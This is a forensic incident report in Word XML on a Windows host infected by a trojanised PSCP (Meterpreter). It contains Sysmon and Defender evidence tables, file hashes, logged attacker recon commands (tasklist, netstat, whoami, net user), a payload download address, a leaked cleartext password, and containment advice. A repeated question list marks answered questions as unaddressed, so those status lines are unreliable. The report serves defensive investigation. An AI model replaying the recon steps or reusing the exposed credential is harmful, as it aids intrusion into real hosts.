        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>powershell</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 736, ProcessGUID: e6e9f951-0f56-654e-af01-000000000500 | RuleName: - | MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481 | ParentProcess: C:\Windows\Sys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18677</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:11:23.852357</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tasklist</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 8012, ProcessGUID: e6e9f951-0fdb-654e-ba01-000000000500 | RuleName: - | MD5=80036C62EACEEFAC7F7DF133634321F5,SHA256=9F60240830FAF4DE590360561A6E249F5D0C41FF8AFBB9498BBE5C1A80ABD02C,IMPHASH=DCE1F3B1BD09BBAD166CE65677E33EDB | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18682</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:12:23.447885</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>netstat  -ntb</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 6292, ProcessGUID: e6e9f951-1017-654e-c701-000000000500 | RuleName: - | MD5=2445DECE99DEEDBD701DC6DFE10E648E,SHA256=5A780D6630639FFB7FD3D295C182EAA2A7CAD2C70248C5BA8F334BB3803353CA,IMPHASH=F495C58FFEE3A623AD7AAA6BE78756D5 | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18688</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:25.703963</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>whoami  /user</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7220, ProcessGUID: e6e9f951-1055-654e-cb01-000000000500 | RuleName: - | MD5=2EEEEC89E705F73FFBCAE014E1828788,SHA256=A8A4C4719113B071BB50D67F6E12C188B92C70EEAFDFCD6F5DA69B6AAA99A7FD,IMPHASH=7FF0758B766F747CE57DFAC70743FB88 | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18694</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.772808</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>net  user administrator</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 736, ProcessGUID: e6e9f951-105f-654e-cc01-000000000500 | RuleName: - | MD5=A63DF9A6E9098CC189F2A3EFC37600F6,SHA256=96CDFD7B263947A6A7C0DB54141A6B8D7777DB0A03A17CBF95666D98422F937B,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07 | ParentProcess: C:\Windows\Sys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18695</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.786440</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\system32\net1  user administrator</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 1152, ProcessGUID: e6e9f951-105f-654e-cd01-000000000500 | RuleName: - | MD5=0F641F87A791AE07C00A725BBBD77724,SHA256=286E7F127B06386BD1CC9664851848F483A867F0F604AA352893151068715FAA,IMPHASH=41DBA1AF77E1A2260F0CE46D59ADCB5E | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18696</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx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bl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Q7. What executable was the malicious executable masquerading as?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evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-windows defender%4operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>It posed as PuTTY's PSCP, the PuTTY Secure Copy client. The file is named pscp.exe, and the PE version info recorded in Sysmon EID 1 reads OriginalFileName=PSCP, Product "PuTTY suite", version "Release 0.79". Defender nevertheless identified the binary as Trojan:Win64/Meterpreter.E, and once executed it migrated into a spawned explorer.exe. Real PSCP never does that, so this is a trojanised or backdoored PSCP (an msfvenom-style template injection).</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10:16:44.708098</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>file:_C:\Users\medmondson\Downloads\pscp.exe; webfile:_C:\Users\medmondson\Downloads\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:8820,ProcessStart:133440850044617643</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 1116 | Microsoft-Windows-Windows Defender | Detection - The antimalware platform detected malware or other potentially unwanted software | Malware name: Trojan:Win64/Meterpreter.E | Description: Trojan (Severe) | Detection Time: 2023-11-10T10:16:43.470Z | Process (if real-time detection): C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23715</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx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bl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Q8. What are the hashes of the malicious executable(s), for submission to VirusTotal by the analyst?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artifact:prefetch</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>C:\Payloads\pscp.exe, hashes taken from Sysmon EID 1 (RecordID of the 11:03:09 event):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- MD5 DED9E58DD95A88A4BEE89B74A65F05F1</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- SHA256 ABBF7B5F7A059348A17DCD8BCD464767125F54B4F8691F0F810AC1819C6CF931</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- IMPHASH ADD361A4F3939AF38D11873F1D74BDED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>No Amcache SHA1 exists for this file. There are no recorded hashes for C:\Payloads\test.exe, C:\Users\medmondson\1.exe or the Recycle Bin copy $RHOVDEL.exe: none of them ran under Sysmon and none has an Amcache entry. All three are 986,624 bytes, the same size as pscp.exe. To submit them, hash them from the image or collect the files (they are still allocated).</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2023-11-10 11:03:09.902865</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>"C:\Payloads\pscp.exe"</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 2196, ProcessGUID: e6e9f951-0ded-654e-8f01-000000000500 | RuleName: - | MD5=DED9E58DD95A88A4BEE89B74A65F05F1,SHA256=ABBF7B5F7A059348A17DCD8BCD464767125F54B4F8691F0F810AC1819C6CF931,IMPHASH=ADD361A4F3939AF38D11873F1D74BDED | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18650</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.900579</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>PSCP.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=1DCA12FC False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#98</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\PSCP.EXE-1DCA12FC.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.603703</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\1.exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#119927</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:21:41.003421</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Payloads\test.exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#109630</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>What is the malicious executable?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>(question not addressed by the analysis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>What process did the malicious executable migrate to?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>(question not addressed by the analysis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Were any situational awareness commands run? If so, what were they?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>(question not addressed by the analysis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Which IP and port is the malicious executable communicating with?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>(question not addressed by the analysis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Are there any other weird processes that can be associated with the malicious executable? If so, did they run?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>(question not addressed by the analysis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Give the chain of processes used by the malicious executable (mal.exe -&gt; migrated.exe -&gt; other exes), using ProcessGuid and ParentProcessGuid.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>(question not addressed by the analysis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>What executable was the malicious executable masquerading as?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>(question not addressed by the analysis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>What are the hashes of the malicious executable(s), for submission to VirusTotal by the analyst?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>(question not addressed by the analysis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. Recommendations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Immediate actions (containment)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Isolate DESKTOP-KJ81A5A from the network (EDR/VLAN quarantine) while keeping it powered on so a memory image can be captured first (winpmem). The injected explorer.exe PID 7324 and the lsass artefacts exist only in RAM.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Block 10.0.0.12 (in particular TCP 8080 and all ports) at the perimeter and on internal firewalls, then look for any other host that talked to it.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Reset the medmondson password (exposed in cleartext in Desktop\not_my_pass.txt and potentially dumped from lsass) and the local Administrator password, and invalidate any reuse of password123!@# elsewhere.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Collect C:\Payloads\pscp.exe, C:\Payloads\test.exe, C:\Users\medmondson\1.exe and C:\$Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$RHOVDEL.exe and hash them (SHA256/SHA1) for VirusTotal submission.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Eradication and recovery</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Delete the payload copies and the C:\Payloads directory once they are preserved as evidence.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Remove the Defender exclusion HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Payloads\, turn Real-Time Protection, cloud-delivered protection, automatic sample submission and Tamper Protection back on, and run a full offline scan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Given the administrator-level compromise and the lsass access, reimage the host instead of cleaning it in place; restore user data only after scanning it.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
